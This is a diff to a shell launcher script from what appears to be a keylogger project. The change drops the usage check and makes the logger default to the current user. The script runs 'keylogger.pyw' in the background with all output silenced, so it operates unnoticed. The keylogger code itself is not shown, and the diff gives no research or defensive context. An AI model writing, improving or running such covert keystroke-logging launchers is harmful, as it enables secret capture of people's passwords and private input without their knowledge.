@@ -1,9 +1,11 @@
 #!/bin/sh 
 
-if [ $# -lt 1 ]; then
-    echo "[ERROR] Invalid usage";
-    echo "[INFO] Correct usage: run <user> [install]";
-    exit 0;
+LOGGER_USER=$USER
+if [ $# -ge 1 ]; then
+    LOGGER_USER=$1
+    # echo "[ERROR] Invalid usage";
+    # echo "[INFO] Correct usage: run <user> [install]";
+    # exit 0;
 fi
 
 LOG_INSTALL="false"
@@ -18,4 +20,4 @@ if [ $LOG_INSTALL == "true" ]; then
 #install python
 fi
 
-source source/venv/bin/activate; python3 source/keylogger.pyw $1 > /dev/null 2>&1 &
+source source/venv/bin/activate; python3 source/keylogger.pyw $LOGGER_USER > /dev/null 2>&1 &
